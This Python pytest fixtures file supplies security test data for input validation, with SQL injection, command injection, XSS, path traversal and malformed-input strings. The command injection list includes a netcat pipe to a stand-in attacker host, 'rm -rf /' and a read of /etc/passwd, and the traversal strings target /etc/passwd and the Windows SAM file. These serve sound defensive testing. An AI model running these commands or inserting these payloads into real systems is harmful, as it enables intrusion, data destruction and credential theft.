"""Fixtures for security tests.

Provides test data for:
- SQL/NoSQL injection payloads
- Malformed inputs
- Authentication bypass attempts
"""

import pytest
from typing import List, Dict, Any


@pytest.fixture
def injection_payloads() -> Dict[str, List[str]]:
    """SQL/NoSQL injection payloads for testing input validation."""
    return {
        "sql_injection": [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1 UNION SELECT * FROM passwords",
            "' OR 1=1 --",
            "admin' --",
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
            "&& rm -rf /",
            "$(whoami)",
            "`id`",
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "'\"><script>alert(1)</script>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
    }


@pytest.fixture
def malformed_inputs() -> Dict[str, Any]:
    """Malformed inputs to test validation."""
    return {
        "invalid_json": "{invalid json}",
        "invalid_uuid": "not-a-uuid",
        "null_values": None,
        "empty_strings": "",
        "huge_payload": "x" * (10 * 1024 * 1024),  # 10MB
        "invalid_types": {
            "string_as_int": "not an int",
            "dict_as_list": {"key": "value"},
            "list_as_string": ["should", "be", "string"],
        },
        "special_characters": {
            "null_byte": "test\x00string",
            "control_chars": "test\x01\x02\x03",
            "unicode_issues": "test\ud800invalid",
        },
    }


@pytest.fixture
def auth_bypass_attempts() -> List[Dict[str, Any]]:
    """Authentication bypass attempts."""
    return [
        {"name": "no_token", "token": None, "expect_success": False},
        {"name": "invalid_token", "token": "invalid-token", "expect_success": False},
        {"name": "expired_token", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9...", "expect_success": False},
        {"name": "wrong_signature", "token": "valid.jwt.wrong_sig", "expect_success": False},
        {"name": "empty_token", "token": "", "expect_success": False},
        {"name": "malformed_token", "token": "not.a.jwt", "expect_success": False},
    ]


@pytest.fixture
def unauthorized_operations() -> List[Dict[str, Any]]:
    """Unauthorized operation attempts."""
    return [
        {"name": "access_other_user_data", "expect_denied": True},
        {"name": "modify_admin_settings", "expect_denied": True},
        {"name": "delete_other_user_account", "expect_denied": True},
        {"name": "escalate_privileges", "expect_denied": True},
        {"name": "access_system_resources", "expect_denied": True},
    ]


@pytest.fixture
def rate_limit_test_cases() -> List[Dict[str, Any]]:
    """Rate limiting test cases."""
    return [
        {"name": "single_request", "count": 1, "expect_limited": False},
        {"name": "normal_load", "count": 10, "expect_limited": False},
        {"name": "high_load", "count": 100, "expect_limited": True},
        {"name": "burst_attack", "count": 1000, "expect_limited": True},
    ]


@pytest.fixture
def data_exposure_test_cases() -> List[Dict[str, Any]]:
    """Data exposure / information disclosure test cases."""
    return [
        {"name": "error_message_leakage", "expect_leaked": False},
        {"name": "stack_trace_exposure", "expect_leaked": False},
        {"name": "sensitive_header_leakage", "expect_leaked": False},
        {"name": "timing_attack_vulnerable", "expect_vulnerable": False},
    ]
